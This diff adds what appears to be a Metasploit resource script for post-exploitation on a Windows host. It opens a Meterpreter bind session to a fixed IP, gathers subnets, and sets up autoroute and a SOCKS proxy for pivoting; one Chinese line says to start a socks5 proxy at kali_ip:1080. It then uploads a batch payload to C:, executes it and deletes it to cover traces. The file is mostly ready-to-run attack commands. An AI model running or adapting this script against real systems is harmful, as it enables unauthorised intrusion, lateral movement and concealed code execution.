@@ -1,0 +1,22 @@
+# setg Proxies socks5:127.0.0.1:1080
+use exploit/multi/handler 
+set payload windows/meterpreter/bind_tcp
+set rhost 192.168.50.153
+set lport 1234
+run -j
+# background
+sleep 3
+
+sessions -i 1 -C "run get_local_subnets"
+echo "sessions -i 1 -C \"run autoroute -s 192.168.??.0/24\""
+
+echo "use auxiliary/server/socks_proxy"
+echo "run -j"
+echo "启动socks5代理 kali_ip:1080 "
+
+sessions -i 1 -c 'whoami'
+# upload 1.bat %TEMP%
+sessions -i 1 -C "upload msf_tcp_bind_withcmd_secure.bat C:"
+sessions -i 1 -C "execute -f C:/msf_tcp_bind_withcmd_secure.bat"
+sleep 1
+sessions -i 1 -C "rm C:/msf_tcp_bind_withcmd_secure.bat"
